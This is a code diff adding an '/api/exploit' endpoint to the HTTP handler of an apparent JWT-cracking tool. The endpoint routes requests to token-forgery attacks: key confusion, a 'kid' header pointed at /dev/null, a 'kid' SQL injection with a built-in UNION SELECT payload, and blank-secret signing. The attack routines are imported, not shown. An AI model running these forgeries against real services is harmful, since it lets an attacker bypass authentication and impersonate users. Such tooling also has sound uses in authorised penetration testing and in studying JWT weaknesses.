@@ -350,6 +350,35 @@ class JwtRequestHandler(http.server.BaseHTTPRequestHandler):
                 self._send_json({"forged": forged})
             except Exception as e:
                 self._send_json({"error": str(e)}, status=400)
+
+        elif self.path == "/api/exploit":
+            token = payload.get("token", "")
+            attack = payload.get("attack", "devnull")
+            claims = payload.get("claims", {})
+            try:
+                from jwtcrack.exploits import (
+                    forge_key_confusion,
+                    forge_kid_devnull,
+                    forge_kid_sqli,
+                    forge_blank_secret,
+                )
+                if attack == "key-confusion":
+                    pub_key = payload.get("public_key", "")
+                    forged = forge_key_confusion(token, pub_key, claims)
+                elif attack == "devnull":
+                    kid = payload.get("kid", "/dev/null")
+                    forged = forge_kid_devnull(token, claims, kid=kid)
+                elif attack == "sqli":
+                    injection = payload.get("kid", "key' UNION SELECT 'secret123' -- -")
+                    sec = payload.get("secret", "secret123")
+                    forged = forge_kid_sqli(token, injection=injection, secret=sec, new_claims=claims)
+                elif attack == "blank":
+                    forged = forge_blank_secret(token, claims)
+                else:
+                    raise ValueError(f"Unknown attack technique: {attack}")
+                self._send_json({"forged": forged})
+            except Exception as e:
+                self._send_json({"error": str(e)}, status=400)
         else:
             self.send_response(404)
             self.end_headers()
